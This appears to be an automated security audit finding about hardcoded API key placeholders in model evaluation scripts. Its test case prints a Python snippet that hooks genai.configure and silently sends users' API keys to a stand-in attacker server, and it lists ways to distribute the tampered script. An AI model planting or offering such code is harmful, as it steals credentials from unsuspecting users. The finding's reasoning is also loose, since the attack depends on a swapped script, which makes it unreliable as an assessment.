- Vulnerability Name: Hardcoded API Key Placeholder
- Description:
    - The evaluation scripts for closed-source models, such as Gemini and GPT models, contain a hardcoded placeholder for API keys.
    - Specifically, lines like `genai.configure(api_key="")` in Gemini scripts and similar configurations for OpenAI and Claude models are present in the evaluation scripts.
    - Users are instructed to manually replace the empty string `""` with their actual API keys to run the evaluation scripts.
    - An attacker could modify these scripts and replace the placeholder with malicious code that, after a user inputs their API key, exfiltrates the key to a remote server controlled by the attacker.
    - When a user, tricked into using the compromised script, runs it, their API key will be exposed to the attacker.
- Impact:
    - Compromise of user's API keys for services like Google Gemini, OpenAI GPT, or Anthropic Claude.
    - Unauthorized access to and usage of the cloud services associated with the compromised API keys, potentially leading to financial charges for the victim.
    - Data breaches or misuse of the services under the compromised account, depending on the scope of access granted by the API key.
- Vulnerability Rank: High
- Currently Implemented Mitigations:
    - None. The code encourages users to directly edit the script and hardcode their API keys, although as placeholders.
    - The README.md provides instructions on how to run the evaluation scripts and mentions the need to fill in the API keys, but it does not warn users against security risks of hardcoding API keys directly in the scripts or offer secure alternatives.
- Missing Mitigations:
    - Removal of hardcoded API key placeholders from the evaluation scripts.
    - Implementation of secure API key management practices, such as utilizing environment variables or dedicated configuration files to store and access API keys.
    - Inclusion of clear warnings in the README and other relevant documentation about the security risks associated with hardcoding API keys directly in scripts.
    - Provision of secure and recommended methods for users to manage their API keys when using the evaluation scripts, such as using environment variables and `.env` files, or configuration files that are not part of the committed repository.
- Preconditions:
    - The user must intend to evaluate closed-source models (Gemini, GPT, Claude) using the provided evaluation scripts.
    - The user must possess a valid API key for the respective closed-source model service (Google Gemini API key, OpenAI API key, Anthropic API key).
    - The user must be socially engineered or unknowingly use a compromised version of the evaluation scripts where the API key placeholder has been replaced with malicious code.
- Source Code Analysis:
    - In files like `/code/evals/test-c/closed_models/gemini_cot_qa_test-c_evaluation_image+caption.py`, `/code/evals/test-c/closed_models/gemini_qa_test-c_evaluation_caption_only.py`, `/code/evals/test-c/closed_models/gpt4v_cot_qa_test-c_evaluation_image+caption.py`, and many other similar scripts located in `/code/evals/*/closed_models/`:
        - The line `genai.configure(api_key="")` (for Gemini models) or similar API configuration lines for other closed-source models are present.
        - This line shows a hardcoded empty string `""` as a placeholder for the `api_key` argument.
        - Users are expected to manually modify these scripts to replace `""` with their actual API keys.
        - Attackers can modify these scripts to intercept the API key right after the user pastes it into the script, before or during the execution of the evaluation process.
- Security Test Case:
    1. **Setup:**
        - Assume an attacker has basic knowledge of Python and API interactions.
        - Assume the attacker has access to modify and redistribute the evaluation script `evals/test-c/closed_models/gemini_cot_qa_test-c_evaluation_image+caption.py`.
        - Assume a victim user intends to use this script for evaluating Gemini models and has a valid Gemini API key.
    2. **Attacker's Modification:**
        - The attacker modifies the script `evals/test-c/closed_models/gemini_cot_qa_test-c_evaluation_image+caption.py`.
        - The attacker replaces the line `genai.configure(api_key="")` with the following malicious code snippet:
        ```python
        import requests
        import google.generativeai as genai

        api_key_to_exfiltrate = ""
        attacker_endpoint = "https://attacker.example.com/api_key_receiver" # Replace with attacker's server

        def configure_api_and_exfiltrate(api_key):
            global api_key_to_exfiltrate
            api_key_to_exfiltrate = api_key
            genai.configure(api_key=api_key)
            try:
                requests.post(attacker_endpoint, data={'api_key': api_key_to_exfiltrate}, timeout=5) # Send API key to attacker's server
                print("API Key exfiltrated in background.") # Optional: To notify attacker action, can be removed for stealth
            except requests.exceptions.RequestException as e:
                print(f"Warning: API key exfiltration failed but evaluation will proceed. Error: {e}") # Non-blocking exfiltration

        genai.configure = configure_api_and_exfiltrate
        ```
        - The attacker sets `attacker_endpoint` to a server they control to receive exfiltrated API keys.
    3. **Distribution of Compromised Script:**
        - The attacker distributes the modified script to potential victims. This could be done by:
            - Hosting the modified script on a fake website that looks like the original repository.
            - Sharing the script through social engineering tactics, posing as a legitimate source.
            - Contributing the malicious script to the project if possible, hoping maintainers won't notice immediately.
    4. **Victim User Action:**
        - A victim user, intending to evaluate Gemini CoT QA on test-C, downloads and uses the compromised script `gemini_cot_qa_test-c_evaluation_image+caption.py`.
        - Following the project's instructions (e.g., from README.md), the user opens the script in a text editor.
        - The user locates the line where API key needs to be inserted, which now contains the malicious code.
        - The user, unknowingly, proceeds to enter their valid Gemini API key as instructed, effectively providing the key to the malicious function.
    5. **Execution and Exfiltration:**
        - The user executes the modified script: `python gemini_cot_qa_test-c_evaluation_image+caption.py --response_root <path_to_save_responses> --image_resolution -1 --model_id gemini-1.5-pro`.
        - When the script runs, the `configure_api_and_exfiltrate` function is called.
        - This function first configures the Gemini API for the script's legitimate evaluation purpose.
        - Then, in the background, it attempts to send the API key to `attacker.example.com/api_key_receiver` via an HTTP POST request.
        - The script proceeds with the evaluation task, potentially without the user noticing the background exfiltration (or with a non-blocking warning in case of exfiltration failure, depending on attacker's modification).
    6. **Attacker Receives API Key:**
        - The attacker's server at `attacker.example.com` receives the POST request containing the victim's Gemini API key.
        - The attacker now has the compromised API key and can use it for unauthorized access to the Gemini API service.
    7. **Verification:**
        - Check attacker's server logs to confirm successful receipt of the API key from the victim.
        - (Optional) Monitor the victim's Gemini API usage for unauthorized activities after the test execution.

This test case demonstrates how an attacker can exploit the hardcoded API key placeholder vulnerability to steal API keys from users who are tricked into using a modified evaluation script.